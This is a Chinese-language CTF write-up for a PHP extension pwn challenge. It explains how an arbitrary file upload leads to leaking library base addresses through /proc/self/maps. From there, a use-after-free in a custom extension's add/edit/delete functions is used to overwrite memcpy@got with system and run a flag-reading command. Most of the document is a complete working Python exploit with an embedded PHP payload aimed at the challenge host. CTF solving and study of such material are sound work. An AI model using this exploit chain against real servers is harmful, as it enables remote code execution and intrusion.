## 思路

页面只有任意文件上传，上传的 `.php` 会直接落到 Web 根目录执行。  
`php.ini` 禁了大量文件/命令函数，但 `include` 没禁，所以可以直接 `include("/proc/self/maps")` 泄露当前 Apache/PHP 进程里 `vuln.so` 和 `libc.so.6` 的基址。

`vuln.so` 暴露了 3 个关键函数：

- `add(idx, size)`：`_emalloc(size)` 后把指针放进全局 `heap[idx]`
- `edit(idx, str)`：`memcpy(heap[idx], str, len)`
- `delete(idx)`：`_efree(heap[idx])`，有uaf

因此可以对已释放块做 UAF / freelist 污染：

1. `add(0, 0x10)` 申请一个小块。
2. `delete(0)` 释放后，`heap[0]` 仍然保留悬空指针。
3. `edit(0, pack("P", $got_pair))` 改写 free slot 的 next 指针。
4. 两次 `add(..., 0x10)` 后，第二次得到目标地址`vuln_base + 0x4020`。
5. 向该位置写 16 字节：前 8 字节清零，后 8 字节把 `memcpy@got` 改成 `system`。
6. 预先在另一个 chunk 里放入命令 `/readflag>/var/www/html/x\0`，再调用一次 `edit`，就会实际执行 `system(chunk_data)`。
7. 最后访问 `/x` 读出 flag。

## Exp

```python
import requests


BASE = "http://80-124df85d-dca6-48b8-8ebd-ff8b24bcca20.challenge.ctfplus.cn"
UPLOAD_NAME = "exp.php"
DROP_NAME = "x"

PHP_PAYLOAD = r"""<?php
error_reporting(E_ALL);

ob_start();
include("/proc/self/maps");
$maps = ob_get_contents();
ob_end_flush();

preg_match('/^([0-9a-f]+)-[0-9a-f]+ r--p 00000000 .*vuln\.so$/m', $maps, $mv);
preg_match('/^([0-9a-f]+)-[0-9a-f]+ r--p 00000000 .*libc\.so\.6$/m', $maps, $ml);

$vuln = hexdec($mv[1]);
$libc = hexdec($ml[1]);
$got_pair = $vuln + 0x4020;
$system = $libc + 0x53110;
$cmd = "/readflag>/var/www/html/x\0";

add(9, 0x30);
edit(9, $cmd);

add(0, 0x10);
delete(0);
edit(0, pack("P", $got_pair));
add(1, 0x10);
add(2, 0x10);
edit(2, pack("P", 0) . pack("P", $system));

edit(9, "A");
echo "\nDONE\n";
"""


def main():
    s = requests.Session()
    files = {"file": (UPLOAD_NAME, PHP_PAYLOAD, "application/x-php")}
    r = s.post(BASE + "/", files=files, timeout=10)
    r.raise_for_status()

    r = s.get(f"{BASE}/{UPLOAD_NAME}", timeout=10)
    r.raise_for_status()

    r = s.get(f"{BASE}/{DROP_NAME}", timeout=10)
    r.raise_for_status()
    print(r.text.strip())


if __name__ == "__main__":
    main()
```
